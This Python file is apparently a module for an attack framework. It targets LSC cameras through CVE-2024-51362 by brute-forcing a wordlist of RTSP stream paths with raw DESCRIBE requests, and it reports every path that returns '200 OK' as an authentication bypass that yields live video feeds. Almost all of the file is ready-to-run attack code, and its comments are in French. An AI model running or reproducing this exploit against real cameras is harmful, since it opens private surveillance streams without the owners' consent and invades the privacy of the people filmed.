import asyncio
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "lsc/rtsp_unauth_attack"
        self.description = "Bruteforce RTSP streaming directory to bypass authentication on LSC cameras (CVE-2024-51362)."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "8554"}
        }
        # Chemins de diffusion d'origine les plus courants pour ces caméras
        self.wordlist = [
            "live/ch0", "live/ch1", "onvif1", "onvif2", "Streaming/Channels/101", 
            "mpeg4", "ch0_0.264", "minneapolis", "video1", "unicast"
        ]

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = int(self.options["PORT"]["value"])
        
        successful_paths = []
        
        for path in self.wordlist:
            try:
                # Établissement de la socket brute pour simuler une requête RTSP DESCRIBE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port), 
                    timeout=3.0
                )
                
                # Payload minimal conforme au protocole RFC 2326 (RTSP/1.0)
                rtsp_request = (
                    f"DESCRIBE rtsp://{target}:{port}/{path} RTSP/1.0\r\n"
                    f"CSeq: 1\r\n"
                    f"User-Agent: dvr-framework/1.0\r\n\r\n"
                )
                
                writer.write(rtsp_request.encode())
                await writer.drain()
                
                response = await reader.read(1024)
                response_text = response.decode(errors="ignore")
                
                writer.close()
                await writer.wait_closed()
                
                # Le code "RTSP/1.0 200 OK" indique que le flux est accessible sans mot de passe
                if "200 OK" in response_text:
                    successful_paths.append(f"rtsp://{target}:{port}/{path}")
                    
            except Exception:
                continue
                
        if successful_paths:
            return {
                "success": True,
                "details": f"Authentication bypass successful. Valid live feeds found:\n - " + "\n - ".join(successful_paths)
            }
        else:
            return {
                "success": False,
                "details": "RTSP port active but all common stream directory pathways returned unauthorized (401) or bad requests."
            }
